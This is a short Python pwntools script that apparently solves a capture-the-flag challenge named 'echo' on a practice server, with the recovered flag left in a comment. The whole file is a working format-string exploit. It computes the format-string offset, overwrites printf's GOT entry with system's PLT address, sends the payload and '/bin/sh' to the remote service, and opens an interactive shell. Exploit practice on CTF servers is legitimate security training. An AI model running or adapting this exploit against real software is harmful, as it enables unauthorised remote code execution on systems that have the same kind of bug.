from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')

def exec_fmt(payload):
    p = process('/home/zander/Desktop/ctf/echo')
    p.sendline(payload)
    info = p.recv()
    p.close()
    return info

elf = ELF('/home/zander/Desktop/ctf/echo')
printf_addr = elf.got['printf']
system_addr = elf.plt['system']
offset = FmtStr(exec_fmt).offset
payload = fmtstr_payload(offset, {printf_addr: system_addr})

# p = process('/home/zander/Desktop/ctf/echo')
p = remote('hackme.inndy.tw', 7711)
# p.sendline("%" + str(offset + 1) + "$s" + p32(0x08048000)) # get 'ELF'
p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
p.close()

# FLAG{printf vulnerability is fun, right? %16c%7$hhn%99c%7$hhn}